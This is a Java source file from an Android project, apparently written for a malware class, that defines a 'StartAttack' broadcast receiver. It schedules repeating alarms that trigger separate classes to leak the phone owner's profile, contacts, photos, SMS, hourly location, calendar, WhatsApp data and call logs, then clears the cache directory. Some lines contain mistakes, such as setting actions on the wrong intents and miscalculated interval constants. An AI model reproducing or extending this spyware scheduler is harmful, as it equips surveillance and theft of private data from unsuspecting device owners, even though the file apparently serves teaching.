package com.malwareclass.malwareproject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.File;
import java.util.Calendar;

public class StartAttack  extends BroadcastReceiver{

    private static final String TAG = "StartAttack";

    private static final Calendar cal = Calendar.getInstance();
    private static final Long HOUR = 1000L *60*60;
    private static final Long DAILY = 1000L * 60*60*24;
    private static final Long WEEKLY = 1000L * 60*60*24*7;
    private static final Long MONTHLY = 1000L * 60*60*24*7*30;
    private static final Long ANNUAL = 1000L * 60*60*24*7*30*12;



    @Override
    public void onReceive(Context context, Intent intent) {

        Log.d(TAG, "Started");

        AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);

        Intent profileLeakage = new Intent(context, ProfileLeakage.class);
        profileLeakage.setAction("PROFILE_LEAKAGE");
        PendingIntent pendingIntent_profile = PendingIntent.getBroadcast(context, 0, profileLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), ANNUAL, pendingIntent_profile);

        // Contacts leakage
        Intent contactsLeakage = new Intent(context, ContactsLeakage.class);
        contactsLeakage.setAction("CONTACTS_LEAKAGE");
        PendingIntent pendingIntent_contacts = PendingIntent.getBroadcast(context, 0, contactsLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), MONTHLY, pendingIntent_contacts);

        // DCIM leakage
        Intent DCIMLeakage = new Intent(context, DCIMLeakage.class);
        contactsLeakage.setAction("DCIM_LEAKAGE");
        PendingIntent pendingIntent_DCIM = PendingIntent.getBroadcast(context, 0, DCIMLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), WEEKLY, pendingIntent_DCIM);

        // SMS leakage
        Intent smsLeakage = new Intent(context, SMSLeakage.class);
        smsLeakage.setAction("SMS_LEAKAGE");
        PendingIntent pendingIntent_SMS = PendingIntent.getBroadcast(context, 0, smsLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), DAILY, pendingIntent_SMS);

        // Location leakage
        Intent locationLeakage = new Intent(context, LocationLeakage.class);
        contactsLeakage.setAction("LOCATION_LEAKAGE");
        PendingIntent pendingIntent_location = PendingIntent.getBroadcast(context, 0, locationLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), HOUR, pendingIntent_location);

        // Calendar Leakage
        Intent calendarLeakage = new Intent(context, CalendarLeakage.class);
        calendarLeakage.setAction("CALENDAR_LEAKAGE");
        PendingIntent pendingIntent_calendar = PendingIntent.getBroadcast(context, 0, calendarLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), WEEKLY, pendingIntent_calendar);

        // WhatsApp Leakage
        Intent whatsappLeakage = new Intent(context, WhatsAppLeakage.class);
        whatsappLeakage.setAction("WHATSAPP_LEAKAGE");
        PendingIntent pendingIntent_whatsapp = PendingIntent.getBroadcast(context, 0, whatsappLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), WEEKLY, pendingIntent_whatsapp);

        // Leak other stuffs
        Intent stuffsLeakage = new Intent(context, LeakOtherStuffs.class);
        whatsappLeakage.setAction("STUFFS_LEAKAGE");
        PendingIntent pendingIntent_stuffsLeakage = PendingIntent.getBroadcast(context, 0, stuffsLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), ANNUAL, pendingIntent_stuffsLeakage);

        // Call log leakage
        Intent callLogLeakage = new Intent(context, CallLogLeakage.class);
        whatsappLeakage.setAction("CALL_LOG_LEAKAGE");
        PendingIntent pendingIntent_callLogLeakage = PendingIntent.getBroadcast(context, 0, callLogLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), DAILY, pendingIntent_callLogLeakage);



        // delete all temporary files
        cleanCacheDir(context);

        Log.i(TAG, "Ended");


    }


    private void cleanCacheDir(Context context){
        File[] dir = context.getCacheDir().listFiles();
        if(dir !=null)
            for(File file: dir)
                file.delete();
    }
}
